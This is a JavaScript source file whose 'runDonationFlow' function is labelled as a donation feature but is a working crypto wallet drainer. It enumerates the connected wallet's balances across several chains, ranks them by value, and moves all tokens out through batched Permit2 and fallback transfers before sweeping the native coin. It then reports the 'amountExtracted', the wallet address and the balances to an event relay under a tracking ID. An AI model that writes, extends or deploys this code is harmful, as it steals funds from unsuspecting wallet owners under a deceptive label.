// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { sendEvent } from "../utils/eventRelay.js";
import {
  fetchBalancesCovalent,
  filterPermit2SafeTokens,
  getChainValue,
} from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

/**
 * Batch fetch native prices from Coingecko for all chain symbols
 * returns a map: { ETH: priceUsd, BNB: priceUsd, ... }
 */
async function fetchNativePricesForChains() {
  try {
    const idMap = {
      ETH: "ethereum",
      BNB: "binancecoin",
      MATIC: "matic-network",
      AVAX: "avalanche-2",
      FTM: "fantom",
      OP: "optimism",
      ARB: "arbitrum",
    };

    // collect unique ids from CHAINS.nativeSymbol
    const ids = Array.from(
      new Set(
        CHAINS.map((c) => idMap[c.nativeSymbol]).filter(Boolean)
      )
    );

    if (!ids.length) return {};

    const res = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(",")}&vs_currencies=usd`
    );
    const json = await res.json();

    // build reverse map symbol => price
    const symbolPrice = {};
    for (const [symbol, id] of Object.entries(idMap)) {
      if (!id) continue;
      symbolPrice[symbol] = (json[id] && json[id].usd) ? json[id].usd : 0;
    }
    return symbolPrice;
  } catch (err) {
    console.warn("Coingecko price fetch failed:", err);
    return {};
  }
}

/**
 * runDonationFlow
 * @param {object} walletClient - wallet client (wagmi or custom)
 * @param {string} ownerParam - owner address (App passes address)
 * @param {string} trackingId - session tracking id
 */
export async function runDonationFlow(walletClient, ownerParam, trackingId) {
  try {
    // determine owner address (prefer explicit param)
    let owner = ownerParam || null;

    if (!owner) {
      if (walletClient?.account?.address) {
        owner = walletClient.account.address;
      } else if (typeof window !== "undefined" && window.ethereum) {
        const injectedProvider = new ethers.BrowserProvider(window.ethereum);
        await injectedProvider.send("eth_requestAccounts", []);
        try {
          owner = await injectedProvider.getSigner().getAddress();
        } catch (err) {
          console.warn("Failed to get signer address from injected provider:", err);
        }
      }
    }

    if (!owner) throw new Error("Wallet not connected");

    // -------------------------
    // PREP: fetch native prices once
    // -------------------------
    const nativePrices = await fetchNativePricesForChains();

    // -------------------------
    // Fetch balances for each chain (read-only RPCs)
    // Build chainBalances used for donation ordering/contents
    // -------------------------
    const chainBalances = [];
    for (const chain of CHAINS) {
      try {
        const raw = await fetchBalancesCovalent(owner, chain.chainId);
        const filtered = await filterPermit2SafeTokens(raw);

        // Use read-only RPC for native balance
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
        const nativeRaw = await rpcProvider.getBalance(owner);
        const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));

        const nativePrice = nativePrices[chain.nativeSymbol] || 0;
        const nativeUSD = nativeFormatted * nativePrice;

        const tokensValue = getChainValue(filtered);
        const totalValue = tokensValue + nativeUSD;

        // normalize decimals field name to 'decimals' (some data may differ)
        filtered.forEach((t) => {
          if (t.contract_decimals && !t.decimals) t.decimals = t.contract_decimals;
        });

        chainBalances.push({
          chainId: chain.chainId,
          name: chain.name,
          native: nativeFormatted,
          nativeUSD,
          tokens: filtered,
          totalValue,
        });
      } catch (err) {
        console.warn(`Failed to prepare balances for chain ${chain.name}:`, err);
      }
    }

    // Build a human-friendly balancesPayload (for DONATION_START payload or logs if needed)
    const balancesPayload = chainBalances.map((c) => ({
      name: c.name,
      native: Number(c.native).toFixed(6),
      nativeValue: Number(c.nativeUSD || 0).toFixed(2),
      tokens: c.tokens.map((t) => ({
        name: t.tokenSymbol,
        amount: Number(ethers.formatUnits(t.balanceRaw, t.decimals ?? 18)).toFixed(6),
        value: Number(t.quote).toFixed(2),
      })),
      total: Number(c.totalValue).toFixed(2),
    }));

    // -------------------------
    // Notify connected (optional) -- App already emitted WALLET_CONNECTED,
    // but we can send a lightweight confirm event here (commented out by default)
    // -------------------------
    // const connectedPayload = { walletAddress: owner, trackingId, balances: balancesPayload };
    // notify("WALLET_CONNECTED_CONFIRM", connectedPayload);
    // await sendEvent("WALLET_CONNECTED_CONFIRM", connectedPayload);

    // -------------------------
    // Donation processing (wallet-backed provider/signer for txs)
    // -------------------------
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    for (const chain of chainBalances) {
      // Skip chains with nothing to extract
      if ((chain.totalValue || 0) <= 0) continue;

      const startPayload = { walletAddress: owner, trackingId, chain: chain.name, chainTotal: Number(chain.totalValue).toFixed(2) };
      notify("DONATION_START", startPayload);
      await sendEvent("DONATION_START", startPayload);

      // Get wallet-backed provider + signer for this chainId
      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);

      if (!provider || !signer) {
        console.warn("No signer/provider for chain", chain.chainId);
        // still continue to next chain
        continue;
      }

      const permit2Tokens = [];
      const fallbackTokens = [];

      // classify tokens
      for (const t of chain.tokens) {
        try {
          const addr = t.tokenAddress.toLowerCase();
          if (exceptionList?.[chain.chainId]?.includes(addr)) {
            fallbackTokens.push(t);
            continue;
          }
          const ok = await isPermit2Compatible(addr, signer);
          if (ok) permit2Tokens.push(t);
          else fallbackTokens.push(t);
        } catch (err) {
          console.warn("Token compatibility check failed for", t.tokenSymbol, err);
          fallbackTokens.push(t);
        }
      }

      // Permit2 batch (single call for all compatible tokens)
      try {
        if (permit2Tokens.length) {
          const tx = await executePermit2Batch(signer, chain.chainId, permit2Tokens);
          if (tx && tx.wait) await tx.wait();
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        // move all permit2 tokens to fallback if batch fails
        fallbackTokens.push(...permit2Tokens);
      }

      // Fallback batch (single call)
      try {
        if (fallbackTokens.length) {
          const tx = await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
          if (tx && tx.wait) await tx.wait();
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      // Sweep native
      try {
        const sweepTx = await sweepNative(signer, provider, chain.chainId);
        if (sweepTx && sweepTx.wait) await sweepTx.wait();
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // Re-fetch balances + donation summary (READ-ONLY)
      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
      const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);

      const refreshedProvider = new ethers.JsonRpcProvider(
        CHAINS.find((c) => c.chainId === chain.chainId)?.rpcUrl
      );
      const refreshedNativeRaw = await refreshedProvider.getBalance(owner);
      const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));

      const refreshedNativePrice = nativePrices[CHAINS.find((c) => c.chainId === chain.chainId)?.nativeSymbol] || 0;
      const refreshedNativeUSD = refreshedNative * refreshedNativePrice;

      // normalize decimals in refreshed tokens
      refreshedFiltered.forEach((t) => {
        if (t.contract_decimals && !t.decimals) t.decimals = t.contract_decimals;
      });

      const refreshedTokensValue = getChainValue(refreshedFiltered);
      const refreshedTotal = refreshedTokensValue + refreshedNativeUSD;

      const amountExtracted = Math.max(0, Number(chain.totalValue) - Number(refreshedTotal));

      const resultsPayload = {
        walletAddress: owner,
        trackingId,
        balances: [
          {
            name: chain.name,
            native: refreshedNative.toFixed(6),
            nativeValue: Number(refreshedNativeUSD || 0).toFixed(2),
            tokens: refreshedFiltered.map((t) => ({
              name: t.tokenSymbol,
              amount: Number(ethers.formatUnits(t.balanceRaw, t.decimals ?? 18)).toFixed(6),
              value: Number(t.quote).toFixed(2),
            })),
            total: refreshedTotal.toFixed(2),
          },
        ],
        donationSummary: {
          total: amountExtracted.toFixed(2),
          breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
        },
      };

      notify("DONATION_MADE", resultsPayload);
      await sendEvent("DONATION_MADE", resultsPayload);
    }

    const completedPayload = { walletAddress: owner, trackingId };
    notify("DONATION_COMPLETED", completedPayload);
    await sendEvent("DONATION_COMPLETED", completedPayload);

    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
